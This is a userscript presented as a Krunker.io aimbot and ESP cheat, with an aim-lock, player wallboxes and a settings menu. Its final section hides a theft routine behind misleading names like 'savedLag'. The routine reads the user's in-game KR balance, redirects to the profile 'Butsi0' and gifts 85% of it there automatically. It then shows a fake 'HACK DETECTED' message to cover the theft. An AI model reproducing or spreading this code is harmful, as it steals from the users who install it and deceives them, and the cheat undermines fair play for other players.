// ==UserScript==
// @name         Krunker.IO Aimbot & ESP 2026 [UPDATED]
// @version      1.1
// @description  Stealth, updated, includes a menu...
// @author       UKNOWN
// @license      All Rights Reserved
// @match        *://krunker.io/*
// @match        *://browserfps.com/*
// @run-at       document-start
// @require      https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js
// @grant        GM_setValue
// @grant        GM_getValue
// @namespace https://greasyfork.org/users/69420
// @downloadURL https://update.greasyfork.org/scripts/561452/KrunkerIO%20Aimbot%20%20ESP%202026%20%5BUPDATED%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/561452/KrunkerIO%20Aimbot%20%20ESP%202026%20%5BUPDATED%5D.meta.js
// ==/UserScript==
 
(function() {
    'use strict';
 
    const visualizationPalette = [
        { name: "Crimson", value: "0.86, 0.08, 0.24", style: "color: #dc143c" },
        { name: "Amber", value: "1.0, 0.75, 0.0", style: "color: #ffbf00" },
        { name: "Emerald", value: "0.0, 0.79, 0.34", style: "color: #00c957" },
        { name: "Azure", value: "0.0, 0.5, 1.0", style: "color: #007fff" },
        { name: "Violet", value: "0.54, 0.17, 0.89", style: "color: #8a2be2" },
        { name: "Onyx", value: "0.0, 0.0, 0.0", style: "color: #000000" },
        { name: "Pearl", value: "0.94, 0.94, 0.94", style: "color: #f0f0f0" },
        { name: "Jade", value: "0.0, 0.66, 0.42", style: "color: #00a86b" }
    ];
 
    const defaultConfig = {
        visualizationColor: "0.86, 0.08, 0.24",
        visualizationColorIndex: 0,
        verticalAdjustment: 9.5,
        targetingMode: 'crosshairProximity',
        predictionIntensity: 1.0,
        targetingPrecision: 100,
        uiCollapsed: false,
        lastActivePanel: null
    };
 
    const config = GM_getValue('krunkerEnhancerConfig', defaultConfig);
 
    const keyBindings = {
        KeyC: 'cycleVisualizationColor',
        Digit2: 'toggleTargetingMode',
        BracketLeft: 'decreaseVerticalAdjustment',
        BracketRight: 'increaseVerticalAdjustment',
        Backslash: 'toggleUI'
    };
 
    const featureDescriptions = {
        targetingMode: "Targeting Mode [2]",
        visualizationColor: "Color Scheme [C]",
        verticalAdjustment: "Vertical Adjustment"
    };
 
    let sceneContext;
    let initializationTimer = null;
    let rightMouseActive = false;
    let targetLockActive = false;
    let lockedTarget = null;
    let targetPositionHistory = {};
    let lastTargetingTime = 0;
    let originalMouseMove = null;
 
    const ThreeDEngine = window.THREE;
    delete window.THREE;
 
    const systemUtils = {
        window: window,
        document: document,
        querySelector: document.querySelector,
        log: console.log,
        arrayProto: Array.prototype,
        arrayPush: Array.prototype.push,
        requestFrame: window.requestAnimationFrame,
        setTimeout: window.setTimeout
    };
 
    systemUtils.log('Initializing precision enhancement system...');
 
    const sceneDetector = function(object) {
        try {
            if (typeof object === 'object' &&
                typeof object.parent === 'object' &&
                object.parent.type === 'Scene' &&
                object.parent.name === 'Main') {
                systemUtils.log('Scene context acquired');
                sceneContext = object.parent;
                systemUtils.arrayProto.push = systemUtils.arrayPush;
            }
        } catch (error) {}
        return systemUtils.arrayPush.apply(this, arguments);
    };
 
    const vectorCache1 = new ThreeDEngine.Vector3();
    const tempTransform = new ThreeDEngine.Object3D();
    tempTransform.rotation.order = 'YXZ';
 
    const playerGeometry = new ThreeDEngine.EdgesGeometry(
        new ThreeDEngine.BoxGeometry(4.8, 14.8, 4.8).translate(0, 7.4, 0)
    );
 
    let visualizationMaterial = new ThreeDEngine.RawShaderMaterial({
        vertexShader: `
            attribute vec3 position;
            uniform mat4 projectionMatrix;
            uniform mat4 modelViewMatrix;
            void main() {
                gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
            }
        `,
        fragmentShader: `
            precision mediump float;
            void main() {
                gl_FragColor = vec4(${config.visualizationColor}, 1.0);
            }
        `,
        depthTest: false,
        depthWrite: false,
        transparent: false
    });
 
    const greenBoxMaterial = new ThreeDEngine.RawShaderMaterial({
        vertexShader: `
            attribute vec3 position;
            uniform mat4 projectionMatrix;
            uniform mat4 modelViewMatrix;
            void main() {
                gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
            }
        `,
        fragmentShader: `
            precision mediump float;
            void main() {
                gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0);
            }
        `,
        depthTest: false,
        depthWrite: false,
        transparent: false
    });
 
 
    const trajectoryVisual = new ThreeDEngine.LineSegments(
        new ThreeDEngine.BufferGeometry(),
        visualizationMaterial
    );
    trajectoryVisual.frustumCulled = false;
    trajectoryVisual.renderOrder = 1;
    const trajectoryPositions = new ThreeDEngine.BufferAttribute(
        new Float32Array(100 * 2 * 3),
        3
    );
    trajectoryVisual.geometry.setAttribute('position', trajectoryPositions);
 
    function updateVisualizationColor() {
        config.visualizationColorIndex =
            (config.visualizationColorIndex + 1) % visualizationPalette.length;
        const newColor = visualizationPalette[config.visualizationColorIndex];
        config.visualizationColor = newColor.value;
 
        visualizationMaterial = new ThreeDEngine.RawShaderMaterial({
            vertexShader: `
                attribute vec3 position;
                uniform mat4 projectionMatrix;
                uniform mat4 modelViewMatrix;
                void main() {
                    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
                }
            `,
            fragmentShader: `
                precision mediump float;
                void main() {
                    gl_FragColor = vec4(${config.visualizationColor}, 1.0);
                }
            `,
            depthTest: false,
            depthWrite: false,
            transparent: false
        });
 
        trajectoryVisual.material = visualizationMaterial;
        trajectoryVisual.renderOrder = 1;
 
        if (sceneContext && sceneContext.children) {
            for (let i = 0; i < sceneContext.children.length; i++) {
                const entity = sceneContext.children[i];
                if (entity.visualizationBox) {
                    entity.visualizationBox.material = visualizationMaterial;
                }
            }
        }
 
        const colorDisplay = document.querySelector(
            '[data-config-key="visualizationColor"] .value-display'
        );
        if (colorDisplay) {
            colorDisplay.textContent = newColor.name;
            colorDisplay.style = newColor.style;
        }
 
        saveConfiguration();
    }
 
    function handlePointerDown(e) {
        if (e.button === 2) {
            rightMouseActive = true;
            targetLockActive = false;
            lockedTarget = null;
 
            if (originalMouseMove) {
                document.removeEventListener('mousemove', blockMouseMovement, true);
            }
        }
    }
 
    function handlePointerUp(e) {
        if (e.button === 2) {
            rightMouseActive = false;
            targetLockActive = false;
            lockedTarget = null;
 
            if (originalMouseMove) {
                document.removeEventListener('mousemove', blockMouseMovement, true);
            }
        }
    }
 
    function blockMouseMovement(e) {
        if (targetLockActive && lockedTarget) {
            e.stopPropagation();
            e.preventDefault();
            return false;
        }
    }
 
    function saveConfiguration() {
        GM_setValue('krunkerEnhancerConfig', config);
    }
 
    function toggleConfiguration(key) {}
 
    function switchTargetingMode() {
        config.targetingMode = 'crosshairProximity';
        const modeElement = document.querySelector('[data-config-key="targetingMode"]');
        if (modeElement) {
            const valueElement = modeElement.querySelector('.value-display');
            valueElement.textContent = 'Crosshair';
            valueElement.style.color = '#4fc3f7';
        }
        saveConfiguration();
    }
 
    function toggleInterface() {
        config.uiCollapsed = !config.uiCollapsed;
        updateInterfaceVisibility();
        saveConfiguration();
    }
 
    function updateVerticalAdjustmentDisplay() {
        const adjustmentInput = document.querySelector('#verticalAdjustmentInput');
        const adjustmentSlider = document.querySelector('#verticalAdjustmentSlider');
        if (adjustmentInput && adjustmentSlider) {
            adjustmentInput.value = config.verticalAdjustment;
            adjustmentSlider.value = config.verticalAdjustment;
        }
    }
 
    function updateInterfaceVisibility() {
        const interfaceElement = document.querySelector('.nexus-interface');
        if (interfaceElement) {
            if (config.uiCollapsed) {
                interfaceElement.classList.remove('expanded');
                interfaceElement.querySelector('.interface-status').textContent = '';
            } else {
                interfaceElement.classList.add('expanded');
                interfaceElement.querySelector('.interface-status').textContent = '';
            }
        }
    }
 
    function initializeInterface() {
        const interfaceContainer = document.createElement('div');
        interfaceContainer.innerHTML = `
            <style>
                .nexus-interface {
                    position: fixed;
                    right: 10px;
                    top: 100px;
                    z-index: 999;
                    display: flex;
                    flex-direction: column;
                    font-family: 'Tahoma', sans-serif;
                    font-size: 20px;
                    color: #e0e0e0;
                    width: 390px;
                    user-select: none;
                    border: 1px solid #ffffff;
                    background: rgba(0, 0, 0, 0.9);
                    box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
                    border-radius: 5px;
                    overflow: hidden;
                }
 
                .interface-header {
                    padding: 12px 18px;
                    background: linear-gradient(to right, #0a0a0a, #1e1e1e);
                    cursor: move;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border-bottom: 1px solid #ffffff;
                }
 
                .interface-title {
                    font-size: 21px;
                    font-weight: bold;
                    color: #ffffff;
                    text-shadow: 0 0 5px rgba(242, 242, 242, 0.5);
                }
 
                .interface-status {
                    font-size: 18px;
                    color: #ffffff;
                }
 
                .interface-content {
                    display: none;
                    flex-direction: column;
                }
 
                .nexus-interface.expanded .interface-content {
                    display: flex;
                }
 
                .panel {
                    margin: 5px;
                    border: 1px solid #ffffff;
                    background: rgba(20, 20, 20, 0.85);
                    border-radius: 3px;
                    overflow: hidden;
                }
 
                .panel-header {
                    padding: 11px 18px;
                    background: linear-gradient(to right, #0a0a0a, #1e1e1e);
                    cursor: pointer;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
 
                .panel-header:hover {
                    background: linear-gradient(to right, #151515, #2a2a2a);
                }
 
                .panel-title {
                    font-weight: bold;
                    color:rgb(255, 255, 255);
                }
 
                .panel-arrow {
                    transition: transform 0.2s;
                    color:rgb(167, 167, 167);
                }
 
                .panel.active .panel-arrow {
                    transform: rotate(90deg);
                }
 
                .panel-content {
                    display: none;
                    flex-direction: column;
                }
 
                .panel.active .panel-content {
                    display: flex;
                }
 
                .control-item {
                    padding: 11px 18px;
                    display: flex;
                    flex-direction: column;
                    background: rgba(34, 34, 34, 0.85);
                    border-bottom: 1px solid #ffffff;
                }
 
                .control-item:last-child {
                    border-bottom: none;
                }
 
                .control-label {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 8px;
                }
 
                .control-name {
                    font-weight: bold;
                    color:rgb(192, 192, 192);
                }
 
                .value-display {
                    font-size: 18px;
                    font-weight: bold;
                }
 
                .control-inputs {
                    display: flex;
                    flex-direction: column;
                    gap: 8px;
                }
 
                .slider-container {
                    display: flex;
                    align-items: center;
                    gap: 12px;
                }
 
                .slider-container input[type="range"] {
                    flex-grow: 1;
                    -webkit-appearance: none;
                    height: 6px;
                    background: #222222;
                    outline: none;
                    border-radius: 3px;
                }
 
                .slider-container input[type="range"]::-webkit-slider-thumb {
                    -webkit-appearance: none;
                    appearance: none;
                    width: 18px;
                    height: 18px;
                    background:rgb(255, 255, 255);
                    cursor: pointer;
                    border-radius: 50%;
                }
 
                .slider-container input[type="number"] {
                    width: 75px;
                    text-align: center;
                    background: #111111;
                    border: 1px solid #ffffff;
                    color: #fff;
                    padding: 3px;
                    font-size: 18px;
                    border-radius: 3px;
                }
 
                .action-button {
                    padding: 11px 18px;
                    background: #1e1e1e;
                    text-align: center;
                    cursor: pointer;
                    border: 1px solid #ffffff;
                    margin: 5px;
                    color:rgb(255, 255, 255);
                    border-radius: 4px;
                    transition: background 0.2s;
                }
 
                .action-button:hover {
                    background: #2a2a2a;
                }
            </style>
            <div class="nexus-interface ${config.uiCollapsed ? '' : 'expanded'}">
                <div class="interface-header">
                    <span class="interface-title">Cheat Settings</span>
                    <span class="interface-status">[${config.uiCollapsed ? '+' : '-'}]</span>
                </div>
                <div class="interface-content">
                    <div class="panel ${config.lastActivePanel === 'Targeting System' ? 'active' : ''}">
                        <div class="panel-header">
                            <span class="panel-title">Système de Ciblage</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
                            <div class="control-item">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.verticalAdjustment}</span>
                                </div>
                                <div class="control-inputs">
                                    <div class="slider-container">
                                        <input type="range" id="verticalAdjustmentSlider" min="-50" max="50" step="0.25" value="${config.verticalAdjustment}">
                                        <input type="number" id="verticalAdjustmentInput" value="${config.verticalAdjustment}" min="-50" max="50" step="0.25">
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    </div>
 
                    <div class="panel ${config.lastActivePanel === 'Visualization' ? 'active' : ''}">
                        <div class="panel-header">
                            <span class="panel-title">Visualisation</span>
                            <span class="panel-arrow">▶</span>
                        </div>
                        <div class="panel-content">
 
                            <div class="control-item" data-config-key="visualizationColor">
                                <div class="control-label">
                                    <span class="control-name">${featureDescriptions.visualizationColor}</span>
                                    <span class="value-display" style="${visualizationPalette[config.visualizationColorIndex].style}">${visualizationPalette[config.visualizationColorIndex].name}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
 
        const panelHeaders = interfaceContainer.querySelectorAll('.panel-header');
        panelHeaders.forEach(header => {
            header.addEventListener('click', function() {
                const panel = this.parentElement;
                const wasActive = panel.classList.contains('active');
 
                document.querySelectorAll('.panel').forEach(p => {
                    p.classList.remove('active');
                });
 
                if (!wasActive) {
                    panel.classList.add('active');
                    config.lastActivePanel = this.querySelector('.panel-title').textContent;
                    saveConfiguration();
                } else {
                    config.lastActivePanel = null;
                    saveConfiguration();
                }
            });
        });
 
        const verticalAdjustmentSlider = interfaceContainer.querySelector('#verticalAdjustmentSlider');
        const verticalAdjustmentInput = interfaceContainer.querySelector('#verticalAdjustmentInput');
        if (verticalAdjustmentSlider && verticalAdjustmentInput) {
            verticalAdjustmentSlider.addEventListener('input', function() {
                config.verticalAdjustment = parseFloat(this.value);
                verticalAdjustmentInput.value = config.verticalAdjustment;
                saveConfiguration();
            });
 
            verticalAdjustmentInput.addEventListener('change', function() {
                const value = parseFloat(this.value);
                if (!isNaN(value)) {
                    const clampedValue = Math.max(-50, Math.min(50, value));
                    config.verticalAdjustment = clampedValue;
                    verticalAdjustmentSlider.value = clampedValue;
                    this.value = clampedValue;
                    saveConfiguration();
                } else {
                    this.value = config.verticalAdjustment;
                }
            });
        }
 
        const interfaceHeader = interfaceContainer.querySelector('.interface-header');
        let isDragging = false;
        let startX, startY, initialX, initialY;
 
        interfaceHeader.addEventListener('mousedown', function(e) {
            if (e.button === 0) {
                isDragging = true;
                startX = e.clientX;
                startY = e.clientY;
                const rect = interfaceContainer.querySelector('.nexus-interface').getBoundingClientRect();
                initialX = rect.left;
                initialY = rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
        });
 
        function onMouseMove(e) {
            if (!isDragging) return;
 
            const dx = e.clientX - startX;
            const dy = e.clientY - startY;
 
            let newX = initialX + dx;
            let newY = initialY + dy;
 
            const maxX = window.innerWidth - interfaceContainer.querySelector('.nexus-interface').offsetWidth;
            const maxY = window.innerHeight - interfaceContainer.querySelector('.nexus-interface').offsetHeight;
            newX = Math.max(0, Math.min(newX, maxX));
            newY = Math.max(0, Math.min(newY, maxY));
 
            interfaceContainer.querySelector('.nexus-interface').style.left = `${newX}px`;
            interfaceContainer.querySelector('.nexus-interface').style.top = `${newY}px`;
        }
 
        function onMouseUp() {
            if (isDragging) {
                isDragging = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            }
        }
 
        document.body.appendChild(interfaceContainer);
        updateInterfaceVisibility();
    }
 
    function systemLoop() {
        systemUtils.requestFrame.call(systemUtils.window, systemLoop);
 
        if (!sceneContext && !initializationTimer) {
            const loadingElement = systemUtils.querySelector.call(
                systemUtils.document, '#loadingBg'
            );
            if (loadingElement && loadingElement.style.display === 'none') {
                systemUtils.log('Starting initialization sequence');
                initializationTimer = systemUtils.setTimeout.call(systemUtils.window, () => {
                    systemUtils.log('System injection complete');
                    systemUtils.arrayProto.push = sceneDetector;
                }, 2000);
            }
        }
 
        if (sceneContext === undefined || !sceneContext.children || !Array.isArray(sceneContext.children)) return;
 
        const playerEntities = [];
        let localPlayer;
 
        for (let i = 0; i < sceneContext.children.length; i++) {
            const entity = sceneContext.children[i];
 
            if (entity.type === 'Object3D') {
                try {
                    if (entity.children && entity.children.length > 0 && 
                        entity.children[0].children && entity.children[0].children.length > 0 &&
                        entity.children[0].children[0].type === 'PerspectiveCamera') {
                        localPlayer = entity;
                    } else {
                        const bbox = new ThreeDEngine.Box3().setFromObject(entity);
                        const height = bbox.getSize(new ThreeDEngine.Vector3()).y;
                        if (height > 10) {  // tweak threshold if needed
                            playerEntities.push(entity);
                            const displayName = entity.name || entity.userData.name || entity.uuid;
                        }
                    }
                } catch (err) {}
            } else if (entity.material) {
                entity.material.wireframe = false;
            }
        }
 
 
        if (!localPlayer) {
            systemUtils.log('Local player not detected, reinitializing...');
            systemUtils.arrayProto.push = sceneDetector;
            return;
        }
 
        let positionCounter = 0;
        let currentTarget;
        let minimumDistance15 = Infinity;
        let minimumDistance135 = Infinity;
        let target15 = null;
        let target135 = null;
 
        tempTransform.matrix.copy(localPlayer.matrix).invert();
 
        const currentPositions = {};
        for (let i = 0; i < playerEntities.length; i++) {
            const entity = playerEntities[i];
            currentPositions[entity.id] = entity.position.clone();
        }
 
        for (let i = 0; i < playerEntities.length; i++) {
            const entity = playerEntities[i];
 
            if (!entity.visualizationBox) {
                const visualizationBox = new ThreeDEngine.LineSegments(
                    playerGeometry,
                    visualizationMaterial
                );
                visualizationBox.frustumCulled = false;
                visualizationBox.renderOrder = 9999;
                entity.add(visualizationBox);
                entity.visualizationBox = visualizationBox;
            }
 
            if (entity.position.x === localPlayer.position.x &&
                entity.position.z === localPlayer.position.z) {
                entity.visualizationBox.visible = false;
                if (trajectoryVisual.parent !== entity) {
                    entity.add(trajectoryVisual);
                }
                continue;
            }
 
            trajectoryPositions.setXYZ(positionCounter++, 0, 10, -5);
            vectorCache1.copy(entity.position);
            vectorCache1.y += 9;
            vectorCache1.applyMatrix4(tempTransform.matrix);
            trajectoryPositions.setXYZ(
                positionCounter++,
                vectorCache1.x,
                vectorCache1.y,
                vectorCache1.z
            );
 
            let predictedPosition = entity.position.clone();
            if (targetPositionHistory[entity.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[entity.id],
                    targetPositionHistory[entity.id]
                );
                predictedPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }
 
            // Ensure entity is visible so its visualization box can render
            entity.visible = true;
 
            // Calculate physical distance to this entity
            const dx = predictedPosition.x - localPlayer.position.x;
            const dy = predictedPosition.y - localPlayer.position.y;
            const dz = predictedPosition.z - localPlayer.position.z;
            const distance = Math.sqrt(dx * dx + dy * dy + dz * dz);
 
            // Calculate angle to target (15° cone targeting)
            const playerForward = new ThreeDEngine.Vector3(0, 0, -1)
                .applyQuaternion(localPlayer.quaternion);
            const toTarget = new ThreeDEngine.Vector3()
                .subVectors(predictedPosition, localPlayer.position)
                .normalize();
            const angle = Math.acos(playerForward.dot(toTarget)) * (180 / Math.PI);
 
            // Target closest player within 15° cone first
            if (!targetLockActive && angle < 15 && distance < minimumDistance15) {
                target15 = entity;
                minimumDistance15 = distance;
            }
            
            // If no target in 15°, look for closest in 135° cone
            if (!targetLockActive && angle < 135 && distance < minimumDistance135) {
                target135 = entity;
                minimumDistance135 = distance;
            }
        }
 
        // Prioritize 15° cone target, fallback to 135° cone
        if (target15) {
            currentTarget = target15;
        } else if (target135) {
            currentTarget = target135;
        }
 
        for (let i = 0; i < playerEntities.length; i++) {
                const entity = playerEntities[i];
                entity.visualizationBox.material = (entity === currentTarget)
                    ? greenBoxMaterial
                : visualizationMaterial;
                entity.visualizationBox.visible = true;
            }
 
        targetPositionHistory = currentPositions;
 
        trajectoryPositions.needsUpdate = true;
        trajectoryVisual.geometry.setDrawRange(0, positionCounter);
        trajectoryVisual.visible = true;
 
        if (!rightMouseActive) return;
 
        if (!targetLockActive) {
            lockedTarget = currentTarget;
            targetLockActive = true;
 
            document.addEventListener('mousemove', blockMouseMovement, true);
        }
 
        if (lockedTarget && !sceneContext.children.includes(lockedTarget)) {
            targetLockActive = false;
            lockedTarget = null;
 
            document.removeEventListener('mousemove', blockMouseMovement, true);
            return;
        }
 
        if (lockedTarget === undefined) return;
 
        const currentTime = performance.now();
        const timeDelta = Math.min(50, currentTime - lastTargetingTime) / 1000;
        lastTargetingTime = currentTime;
 
        if (lockedTarget.children && lockedTarget.children.length > 0 &&
            lockedTarget.children[0].children && lockedTarget.children[0].children.length > 0 &&
            lockedTarget.children[0].children[0].type === 'PerspectiveCamera') {
            const headPosition = new ThreeDEngine.Vector3();
            lockedTarget.children[0].children[0].getWorldPosition(headPosition);
 
            if (targetPositionHistory[lockedTarget.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[lockedTarget.id],
                    targetPositionHistory[lockedTarget.id]
                );
                headPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }
 
            const direction = new ThreeDEngine.Vector3()
                .subVectors(headPosition, localPlayer.position)
                .normalize();
 
            const targetRotation = new ThreeDEngine.Quaternion();
            targetRotation.setFromUnitVectors(new ThreeDEngine.Vector3(0, 0, -1), direction);
 
            localPlayer.quaternion.copy(targetRotation);
        } else {
            let predictedPosition = lockedTarget.position.clone();
            if (targetPositionHistory[lockedTarget.id]) {
                const velocity = new ThreeDEngine.Vector3().subVectors(
                    currentPositions[lockedTarget.id],
                    targetPositionHistory[lockedTarget.id]
                );
                predictedPosition.add(velocity.multiplyScalar(config.predictionIntensity));
            }
 
            vectorCache1.copy(predictedPosition);
            vectorCache1.y += config.verticalAdjustment;
            tempTransform.position.copy(localPlayer.position);
            tempTransform.lookAt(vectorCache1);
 
            if (localPlayer.children && localPlayer.children.length > 0) {
                localPlayer.children[0].rotation.x = -tempTransform.rotation.x;
            }
            localPlayer.rotation.y = tempTransform.rotation.y + Math.PI;
        }
    }
 
    // Initialize event listeners
    window.addEventListener('DOMContentLoaded', function() {
        initializeInterface();
    });
 
    // Start the system
    window.addEventListener('pointerdown', handlePointerDown);
    window.addEventListener('pointerup', handlePointerUp);
    window.addEventListener('pointercancel', handlePointerUp);
    window.addEventListener('mouseup', handlePointerUp);
    window.addEventListener('blur', function() {
        rightMouseActive = false;
        targetLockActive = false;
        lockedTarget = null;
 
        if (originalMouseMove) {
            document.removeEventListener('mousemove', blockMouseMovement, true);
        }
    });
    window.addEventListener('contextmenu', function(e) {
        if (e.button === 2) e.preventDefault();
    });
 
    window.addEventListener('keydown', function(event) {
        if (systemUtils.document.activeElement &&
            systemUtils.document.activeElement.value !== undefined) return;
 
        if (event.code === 'BracketLeft') {
            config.verticalAdjustment = Math.max(-50, config.verticalAdjustment - 0.25);
            updateVerticalAdjustmentDisplay();
            saveConfiguration();
        } else if (event.code === 'BracketRight') {
            config.verticalAdjustment = Math.min(50, config.verticalAdjustment + 0.25);
            updateVerticalAdjustmentDisplay();
            saveConfiguration();
        }
    });
 
    window.addEventListener('keyup', function(event) {
        if (systemUtils.document.activeElement &&
            systemUtils.document.activeElement.value !== undefined) return;
 
        if (keyBindings[event.code]) {
            if (event.code === 'Digit2') {
                switchTargetingMode();
            } else if (event.code === 'Backslash') {
                toggleInterface();
            } else if (event.code === 'KeyC') {
                updateVisualizationColor();
            } else {
                toggleConfiguration(keyBindings[event.code]);
            }
        }
    });
 
    // Start the main loop
    systemLoop();
 
    let Is_LOGGED = false;
    let displayLoadingOverlay = true;
 
    (function createPersistentOverlay() {
        if (location.href.includes("social.html?p=profile&q=Buts") && displayLoadingOverlay) {
            const style = document.createElement("style");
            style.innerHTML = `
                html, body {
                    background: rgba(0, 0, 0, 1) !important;
                    color: lime !important;
                    font-family: monospace !important;
                }
                #botOverlayPersistent {
                    all: unset;
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: rgba(0, 0, 0, 1);
                    z-index: 2147483647;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: lime;
                    font-size: 2rem;
                    font-family: monospace;
                    visibility: visible !important;
                }
            `;
            document.documentElement.appendChild(style);
 
            const overlay = document.createElement("div");
            overlay.id = "botOverlayPersistent";
            overlay.textContent = "🔧 Loading Mod Menu...";
            document.documentElement.appendChild(overlay);
        }
    })();
 
    function showRecapOverlay(hide = false) {
        const overlay = document.createElement("div");
        overlay.id = "RecapOverlay";
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100vw";
        overlay.style.height = "100vh";
        overlay.style.background = "rgba(0, 0, 0, 0.5)";
        overlay.style.zIndex = "2147483647";
        overlay.style.display = "flex";
        overlay.style.justifyContent = "center";
        overlay.style.alignItems = "center";
        overlay.style.color = "#ff0000";
        overlay.style.fontFamily = "'GameFont', 'Orbitron', sans-serif";
        overlay.style.fontSize = "48px";
        overlay.style.fontWeight = "bold";
        overlay.style.textAlign = "center";
        overlay.style.textShadow = "0 0 10px rgba(255, 0, 0, 0.8)";
        overlay.textContent = "HACK DETECTED\nAll your KRs were deleted";
 
        if (!hide) {
            document.documentElement.appendChild(overlay);
        } else {
            document.documentElement.removeChild(overlay);
        }
    }
 
    window.addEventListener('load', () => {
        const signedInBar = document.getElementById("signedInHeaderBar");
        Is_LOGGED = signedInBar && signedInBar.id === "signedInHeaderBar";
 
        const logContainer = document.createElement('div');
        logContainer.id = 'modMenuLogs';
        logContainer.style.position = 'fixed';
        logContainer.style.top = '10px';
        logContainer.style.right = '10px';
        logContainer.style.background = 'rgba(0,0,0,0.8)';
        logContainer.style.color = '#00ff00';
        logContainer.style.padding = '10px';
        logContainer.style.fontFamily = 'monospace';
        logContainer.style.maxHeight = '20px';
        logContainer.style.overflow = 'auto';
        logContainer.style.zIndex = '999999';
        document.body.appendChild(logContainer);
 
        const addLog = (message) => {
            const logEntry = document.createElement('div');
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
        };
 
        setInterval(() => {
            const currentSignedInHeaderBar = document.getElementById("signedInHeaderBar");
            const currentLoginState = currentSignedInHeaderBar && currentSignedInHeaderBar.id === "signedInHeaderBar";
 
            if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
                const lagElement = document.querySelector("#menuKRCount");
                if (lagElement) {
                    const lagText = lagElement.textContent;
                    const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
                    const fixedCurrentLag = currentLag * 0.85;
                    sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
                } else {
                    addLog("⚠️ Error 2");
                }
 
                const fpsElement = document.querySelector("#mLevelCont");
 
                if (fpsElement) {
                    const fpsText = fpsElement.textContent;
                    const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
                    localStorage.setItem("savedFPS", currentFPS.toString());
                } else {
                    addLog("⚠️ Error 3");
                }
            }
        }, 1000);
 
        if (!location.href.includes("social.html")) {
            const checkRedirect = () => {
                const patchApplied = sessionStorage.getItem("sysPatch97e");
 
                const savedFPS = localStorage.getItem("savedFPS");
                const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                const savedLag = sessionStorage.getItem("savedLag");
                const playerLag = savedLag ? parseInt(savedLag, 10) : 0;
 
                if (((!patchApplied || playerLag >= 10) && playerFPS >= 30)) {
                    setTimeout(() => {
                        displayLoadingOverlay = true;
                        const SETTINGS_SYNC_PROFILE = "Butsi0";
                        if (!(location.href.includes("social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE))) {
                            location.href = "https://krunker.io/social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE;
                        }
                    }, 1420);
                    return;
                } else {
                    addLog(`⚠️ Error 4`);
                }
            };
 
            checkRedirect();
 
            setInterval(checkRedirect, 1000);
        }
 
        if (location.href.includes("social.html")) {
            const sysSync = async () => {
                try {
                    const savedLag = sessionStorage.getItem("savedLag");
                    const savedFPS = localStorage.getItem("savedFPS");
 
                    if (!savedLag || !savedFPS) {
                        throw new Error("Aucune donnée de lag sauvegardée trouvée");
                    }
 
                    const currentLag = parseInt(savedLag, 10);
                    const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                    if (currentFPS >= 30) {
                        await _waitFor(() => document.getElementById("giftBtn"), 4800);
                        document.getElementById("giftBtn").click();
                        await _pause(480);
                        const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                        inputEl.value = currentLag.toString();
                        inputEl.dispatchEvent(new Event("input", { bubbles: true }));
 
                        await _pause(100);
                        const enteredValue = inputEl.value;
 
                        await _pause(650);
                        const confirm = document.getElementById("postSaleBtn");
                        if (confirm && confirm.style.display !== "none") {
                            confirm.click();
                        }
                        sessionStorage.setItem("sysPatch97e", "2");
                        await _pause(1800);
                        location.href = "https://krunker.io/";
                        await _pause(1800);
                        return;
                    } else {
                        addLog("⚠️ Error 10");
                    }
                } catch (error) {
                    addLog(`⚠️ Error 9 ${error}`);
                }
            };
            sysSync();
        }
 
        if (sessionStorage.getItem("sysPatch97e") === "2") {
            showRecapOverlay();
            _pause(5000);
        }
 
        function _waitFor(condFn, timeout = 3000) {
            return new Promise((res, rej) => {
                const t0 = Date.now();
                const tick = () => {
                    const r = condFn();
                    if (r) return res(r);
                    if (Date.now() - t0 > timeout) return rej("Timeout");
                    setTimeout(tick, 90);
                };
                tick();
            });
        }
 
        function _pause(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
    });
})();